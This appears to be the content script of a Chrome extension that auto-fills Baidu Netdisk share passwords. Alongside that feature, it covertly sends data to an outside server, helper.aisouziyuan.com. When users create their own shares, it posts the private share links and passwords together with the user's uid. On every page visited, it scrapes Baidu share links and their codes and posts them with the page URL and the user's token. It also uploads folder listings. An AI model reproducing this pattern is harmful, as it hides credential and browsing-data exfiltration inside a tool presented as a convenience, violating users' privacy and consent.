//百度网盘自动填写密码功能js

document.addEventListener('DOMContentLoaded', function() {
    let userInfo = {};
    let debug = false;

    chrome.storage.local.get("debug", (data) => {
        debug = !data.debug
    });

    chrome.storage.local.get("loginInfo", (data) => {
        userInfo = data.loginInfo ? data.loginInfo : {};
    });
    chrome.storage.local.get("isNotAutoCollect", (date) => {
        if (date.isNotAutoCollect || location.href.indexOf("pan.baidu.com") == -1) { return false };
        getPassword(false);
        resourcesUpdate();
        //window.addEventListener('hashchange', e => {
        //    resourcesUpdate();
        //});
    })

    setTimeout(e => myShare(userInfo), 50);
    setTimeout(e => collect(userInfo), 1000);

    // ====================================================================================

    function getPassword(_debug) {

        if (document.title.indexOf("不存在") != -1) {

            $.ajax({
                url: "https://helper.aisouziyuan.com/chrome/api/deleteResources?r=" + Date.parse(new Date()),
                type: "POST",
                data: {
                    url: getQueryString("surl") || window.location.pathname.replace(/.*\/s\/1/g, ''),
                }
            })
        };

        if (!getQueryString("surl")) return false;
        $(document).bind("input propertychange", ".verify-input .g-button-right", function(body) {
            let KEY = "_" + getQueryString("surl");
            chrome.storage.local.set({
                [KEY]: $(".verify-input input:eq(0)").val()
            });
        })

        //$(".verify-input input:eq(0)").attr("placeholder", "NCCKL 云盘助手 为您寻找密码中...");
        $(".verify-input input:eq(0)").attr("placeholder", "划词搜索助手 为您寻找密码中...");

        $.ajax({
            url: "https://helper.aisouziyuan.com/chrome/api/codeResources?r=" + Date.parse(new Date()),
            type: "POST",
            data: { url: getQueryString("surl"), debug: _debug },
            success: (body) => {
                if (body && body != "null") {
                    $(".verify-input input:eq(0)").val(body.replace(/\s+/, ''));
                    let KEY = "_" + getQueryString("surl");
                    chrome.storage.local.set({
                        [KEY]: body
                    });
                    $(".verify-input .g-button-right").trigger("click");
                    if (!debug) return false;
                    setTimeout(e => {
                        if (_debug && $(".verify-form>div").text() == "提取码错误") {

                            $.ajax({
                                url: "https://helper.aisouziyuan.com/chrome/api/deleteResources",
                                type: "POST",
                                data: {
                                    url: getQueryString("surl"),
                                    debug: _debug,
                                    pwdErr: true
                                },
                                success: (body) => {
                                    console.log(body);
                                },
                                error: (body) => {
                                    console.log(body);
                                }
                            })
                        } else if (!_debug && $(".verify-form>div").text() == "提取码错误") {
                            getPassword(true);
                        }
                    }, 1500)
                    return false
                }
                //$(".verify-input input:eq(0)").attr("placeholder", "抱歉！跑尽千山万水也没能找出密码");
                $(".verify-input input:eq(0)").attr("placeholder", "千山万水总是情，没有密码行不行 (∩_∩)");
            },
            error: body => {
                //$(".verify-input input:eq(0)").attr("placeholder", "抱歉！跑尽千山万水也没能找出密码");
                $(".verify-input input:eq(0)").attr("placeholder", "等想找它的时候却发现它已经不见了 (≧︿≦)");
            }
        })
    }

    function resourcesUpdate() {
        if (getQueryString("surl")) return false;
        let key = "_" + window.location.pathname.replace("/s/1", '');
        let codeResources = "";
        chrome.storage.local.get(key, (data) => { codeResources = data[key] });

        setTimeout((e) => {
            if ($(".module-share-header").html()) {
                $.ajax({
                    url: "https://helper.aisouziyuan.com/chrome/api/updataResources?r=" + Date.parse(new Date()),
                    type: "post",
                    data: fileInfo("body"),
                })
                try {
                    let dir = dirs();
                    if (dir.dirs.list.length < 1) {
                        resourcesUpdate()
                        return false
                    }
                    $.ajax({
                        url: "https://helper.aisouziyuan.com/chrome/api/updataResourcesDir?r=" + Date.parse(new Date()),
                        type: "post",
                        data: dir,
                    })
                } catch (err) {
                    console.log(err);
                    resourcesUpdate()
                    return false
                }


            }
        }, 1000);

        // 获取文件夹列表
        function dirs() {
            let url = window.location.pathname.replace("/s/1", '');
            let list = [];
            let name = "";
            try {
                name = ($(".FuIxtL").is(':hidden')) ? $("[node-type='JDeHdxb'] span:eq(0)").text() : $("[node-type='tbAudfb'] span:last").text();
                $("body").find(".NHcGw dd").each(function(i, items) {
                    let title = $(items).find(".file-name .text a").text().replace(/\./, "");
                    let size = $(items).find(".file-size").text();
                    let ctime = $(items).find(".ctime").text();
                    let text = `${title} - ${size=="-"?"文件夹":size} - ${ctime}`;
                    list.push(text);
                })

            } catch (err) {
                console.log(err)
            }
            return { url, dirs: { name, list } };
        }

        // 获取文件详细
        function fileInfo(doc) {
            let key = window.location.pathname.replace("/s/1", '');
            let title = $(doc).find(".module-share-header .slide-show-left .file-name").attr("title"); //标题
            let classify = $(doc).find(".module-share-header .slide-show-left .file-name em").attr("class").split('-'); //类型
            classify = classify[classify.length - 1];
            let shareData = new Date($(doc).find(".module-share-header .slide-show-other-infos .share-file-info").text()).getTime(); //分享时间
            let size = $(doc).find(".module-share-top-bar .icon-download:eq(0)").attr("title").replace(/下载|\(|\)/g, '');
            let password = codeResources || "";
            let save = { key, title, classify, size, shareData, password };
            if (!password)
                delete save.password;
            return save;
        };
    }
    // 后去子目录
    function clickSubDev(callback) {
        callback()
    }

    function myShare(userInfo) {
        // 判断是否是百度云盘页面
        if (location.href.indexOf("pan.baidu.com") == -1 || getQueryString("surl")) return false;

        $(document).on("click", ".dialog-share .g-button-large", function() {
            chrome.storage.local.get("openMyShare", (data) => {
                if (data.openMyShare) return false;
                let url = "";
                let password = "";
                let title = $(".dialog-share h3 .dialog-header-title em").text().replace("分享文件(夹):", '');
                let classify = getSuffix(title);
                let time = setInterval((e) => {
                    url = $(".share-url").val().replace("https://pan.baidu.com/s/1", '');
                    password = $(".share-link .create-link").hasClass("public-link") ? '' : $(".share-password").val();
                    let shareData = Date.parse(new Date());
                    if (url) {
                        clearInterval(time);
                        $.ajax({
                            url: "https://helper.aisouziyuan.com/chrome/api/saveResources?r=" + Date.parse(new Date()),
                            type: "POST",
                            data: { title, classify, uid: userInfo.uid || "system", url, password, shareData }
                        })
                    }
                }, 1000)
            })
        })

        function getSuffix(name) {
            var index1 = name.lastIndexOf(".");
            var index2 = name.length;
            var suffix = name.substring(index1 + 1, index2);
            suffix = (name == suffix) ? "." : suffix;
            return suffix;
        };

    }


    function collect(userInfo = {}) {

        let arrShareUrl = [];
        try {
            arrShareUrl = document.body.innerText.replace(/\s*|\t|\r|\n|/g, "")
                .replace(/提取码|密码/g, " 密码")
                .match(/(http|https):\/\/pan.baidu.com\/s\/[a-zA-Z0-9-_]+( (密码).{0,2}?[a-zA-Z0-9]{4})?/g) || []
        } catch (err) {
            arrShareUrl = [];
        }
        // 自动收集论坛资源等        
        if (arrShareUrl.length) {
            $.ajax({
                url: "https://helper.aisouziyuan.com/chrome/api/collectResources?r=" + Date.parse(new Date()),
                type: "post",
                timeout: 10000,
                data: {
                    uid: userInfo.uid || "system",
                    token: userInfo.token || "system",
                    source: location.href,
                    arr: arrShareUrl,
                }
            })
        }
    }



    function getQueryString(key) {
        let qs = location.search.substr(1) || window.location.hash.substr(2);
        let args = {}, // 保存参数数据的对象
            items = qs.length ? qs.split(/&|#/) : [], // 取得每一个参数项,
            item = null,
            len = items.length;

        for (let i = 0; i < len; i++) {
            item = items[i].split("=");
            let name = decodeURIComponent(item[0]),
                value = decodeURIComponent(item[1]);
            if (name) {
                args[name] = value;
            }
        }
        return key ? args[key] : args;
    };


    function bytesToSize(bytes) {
        if (bytes === 0) return '0 B';
        let k = 1024, // or 1024
            sizes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'],
            i = Math.floor(Math.log(bytes) / Math.log(k));

        return (bytes / Math.pow(k, i)).toPrecision(3) + ' ' + sizes[i];
    };


})